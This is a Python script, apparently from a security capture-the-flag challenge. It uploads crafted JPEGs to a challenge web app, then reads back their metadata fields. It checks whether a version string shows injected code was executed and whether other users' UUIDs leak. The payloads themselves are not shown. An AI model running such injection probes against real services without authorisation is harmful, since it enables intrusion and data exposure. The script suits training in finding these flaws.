# upload_gps.py — upload g_*.jpg and inspect latitude/longitude/datetime for execution or leak.
import requests, base64, glob, re, os
BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"
verre = re.compile(r"3\.\d+\.\d+")
UURE  = re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}")

files = sorted(glob.glob("g_*.jpg"))
sent = {}
for f in files:
    m = os.path.splitext(f)[0]
    uri = "data:image/jpeg;base64," + base64.b64encode(open(f,"rb").read()).decode()
    r = requests.post(f"{BASE}/upload", json={"image":uri,"description":m,"user_id":UID})
    sent[m]=r.status_code
    print(f"{f:16} -> {r.status_code}  {r.text[:50].strip()}")

print("\n--- readback ---")
data = requests.get(f"{BASE}/images/{UID}").json()
for img in data:
    if img.get("description") in sent:
        flds = {k: img.get(k) for k in ("latitude","longitude","datetime","summary_ocr","make")}
        hit = any(verre.search(str(v)) for v in flds.values())
        leak = [u for k in flds for u in UURE.findall(str(flds[k])) if u!=UID]
        tag = ""
        if hit: tag += "  <<< VERSION EXECUTED"
        if leak: tag += f"  <<< UUID {leak}"
        print(f"{img['description']:10} {flds}{tag}")
